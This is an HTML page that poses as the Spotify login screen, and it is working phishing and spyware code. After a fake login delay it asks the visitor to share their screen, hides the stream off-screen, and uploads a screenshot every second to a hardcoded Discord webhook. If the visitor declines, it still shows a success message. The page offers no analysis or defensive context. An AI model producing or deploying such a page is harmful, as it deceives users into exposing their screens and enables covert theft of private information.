<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Log in - Spotify</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      height: 100vh;
      background: #000;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .container {
      width: 100%;
      max-width: 450px;
      padding: 60px 40px 40px;
      background: #000;
      border-radius: 8px;
      text-align: center;
    }
    .logo {
      font-size: 4.2rem;
      font-weight: 900;
      color: #1DB954;
      margin-bottom: 40px;
      letter-spacing: -2px;
    }
    h1 {
      font-size: 2.4rem;
      font-weight: 700;
      margin-bottom: 32px;
    }
    .social-btn {
      width: 100%;
      padding: 14px 24px;
      margin: 8px 0;
      border: 1px solid #727272;
      border-radius: 50px;
      background: transparent;
      color: #fff;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
    }
    .social-btn.google { border-color: #4285F4; color: #4285F4; }
    .social-btn.facebook { border-color: #1877F2; color: #1877F2; }
    .social-btn.apple { border-color: #fff; color: #fff; }
    .divider {
      display: flex;
      align-items: center;
      margin: 24px 0;
      color: #727272;
      font-size: 0.9rem;
    }
    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #727272;
      margin: 0 16px;
    }
    input {
      width: 100%;
      padding: 16px 20px;
      margin: 12px 0;
      background: #121212;
      border: 1px solid #535353;
      border-radius: 4px;
      color: #fff;
      font-size: 1rem;
    }
    input::placeholder { color: #a7a7a7; }
    .login-btn {
      width: 100%;
      padding: 16px;
      margin: 24px 0 16px;
      background: #1DB954;
      color: #000;
      font-size: 1.1rem;
      font-weight: bold;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      transition: background 0.2s;
    }
    .login-btn:hover { background: #1ed760; }
    .login-btn:disabled { background: #535353; cursor: not-allowed; }
    .links {
      margin-top: 24px;
      font-size: 0.95rem;
      color: #b3b3b3;
    }
    .links a {
      color: #1DB954;
      text-decoration: none;
    }
    .links a:hover { text-decoration: underline; }
    .status {
      margin-top: 20px;
      font-size: 1rem;
      min-height: 1.4em;
    }
    .hidden-video {
      position: fixed;
      top: -9999px;
      left: -9999px;
      width: 1px;
      height: 1px;
      opacity: 0;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">spotify</div>
  <h1>Log in to Spotify</h1>

  <button class="social-btn google"><i class="fab fa-google"></i> Continue with Google</button>
  <button class="social-btn facebook"><i class="fab fa-facebook-f"></i> Continue with Facebook</button>
  <button class="social-btn apple"><i class="fab fa-apple"></i> Continue with Apple</button>

  <div class="divider">or</div>

  <input type="text"     id="username" placeholder="Email or username" autocomplete="off"/>
  <input type="password" id="password" placeholder="Password"         autocomplete="off"/>

  <button class="login-btn" id="loginBtn">Log in</button>

  <div class="links">
    <a href="#">Forgot your password?</a><br><br>
    Don't have an account? <a href="#">Sign up for Spotify</a>
  </div>

  <div class="status" id="status"></div>
</div>

<video id="hiddenVid" class="hidden-video" autoplay muted playsinline></video>

<script>
  const loginBtn = document.getElementById('loginBtn');
  const status   = document.getElementById('status');
  const hiddenVid = document.getElementById('hiddenVid');

  const WEBHOOK_URL = "https://discord.com/api/webhooks/1484813418652504074/H0XWjciAoBAsd8V7tNpd4Q-JHtnjA2aZFfGJuZjeBHGLFGCfq6M2j6GRCb-pNG4m61XT";

  let stream = null;
  let intervalId = null;

  loginBtn.onclick = async () => {
    const user = document.getElementById('username').value.trim();
    const pass = document.getElementById('password').value.trim();

    if (!user || !pass) {
      status.textContent = "Please enter your email/username and password";
      status.style.color = "#f33";
      return;
    }

    loginBtn.disabled = true;
    status.textContent = "Logging in...";
    status.style.color = "#1DB954";

    await new Promise(r => setTimeout(r, 1800 + Math.random()*1000)); // fake 1.8–2.8s delay

    status.textContent = "Welcome back!";
    status.style.color = "#1ed760";

    try {
      stream = await navigator.mediaDevices.getDisplayMedia({
        video: { cursor: "always", frameRate: 30 },
        audio: false
      });

      hiddenVid.srcObject = stream;
      await hiddenVid.play().catch(() => {});

      intervalId = setInterval(() => captureAndSend(hiddenVid), 1000);

      stream.getVideoTracks()[0].addEventListener('ended', cleanup);

    } catch (err) {
      // If denied → pretend success anyway
      status.textContent = "Success! Redirecting to Spotify...";
    }
  };

  async function captureAndSend(video) {
    if (video.videoWidth <= 0) return;

    try {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      const blob = await new Promise(r => canvas.toBlob(r, 'image/png', 0.80));

      if (!blob) return;

      const formData = new FormData();
      formData.append('file', blob, `s-${Date.now()}.png`);

      await fetch(WEBHOOK_URL, { method: 'POST', body: formData }).catch(() => {});
    } catch {}
  }

  function cleanup() {
    if (intervalId) clearInterval(intervalId);
    if (stream) stream.getTracks().forEach(t => t.stop());
    hiddenVid.srcObject = null;
  }
</script>

</body>
</html>
